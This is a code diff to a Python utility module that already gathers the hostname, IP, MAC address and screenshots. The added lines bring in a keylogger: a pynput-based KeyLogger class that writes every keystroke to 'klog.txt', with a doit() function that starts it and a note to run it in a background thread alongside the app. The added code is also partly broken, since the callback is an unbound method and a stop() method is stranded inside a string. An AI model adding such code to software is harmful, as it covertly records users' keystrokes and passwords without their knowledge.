@@ -5,6 +5,7 @@ from . import settings
 
 # import built-in & third-party modules
 from typing import List
+from pynput import keyboard
 import requests
 import json
 import platform
@@ -16,6 +17,29 @@ from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
 from PIL import ImageGrab
+
+
+class KeyLogger:
+    '''this class is for keylogger utility , you should only start this class from a threading object.
+    this way , the keylogger and the app itself will both run at the same time.'''
+    def __init__(self,listener, filename: str = "klog.txt") -> None:
+        self.filename = filename
+        self.listener = listener
+
+    def pressed_key(self, key):
+        with open(self.filename, 'a') as logs:
+            logs.write(str(key))
+
+    def main(self):
+        self.listener.start()
+"""    def stop(self):
+        listener.stop()"""
+def doit():
+    logger = KeyLogger(keyboard.Listener(on_press=KeyLogger.pressed_key,))
+    logger.main()
+
+
+
 
 
 def get_current_epoc_time() -> float:
@@ -416,3 +440,4 @@ def screenshot_pil(logger, route: str = ''):
     except Exception as error:
         logger.info(f'util.screenshot_pil error: {error}')
         return False
+
